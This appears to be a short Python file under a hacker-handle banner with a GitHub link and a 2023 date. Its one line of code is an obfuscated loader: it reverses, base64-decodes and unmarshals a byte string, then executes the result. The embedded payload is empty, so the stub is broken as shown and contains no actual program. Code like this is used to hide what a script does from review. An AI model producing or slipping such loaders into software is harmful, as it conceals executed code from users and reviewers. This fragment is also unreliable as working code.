# TH3 L3G3ND FAISAL 1NSIDE
# https://www.github.com/ITX-FAISAL
# Time : Thu Jan  5 09:56:45 2023
# -------------------------------
_ = lambda __ : __import__('marshal').loads(__import__('base64').b64decode(__[::-1]));exec((_)(b''))
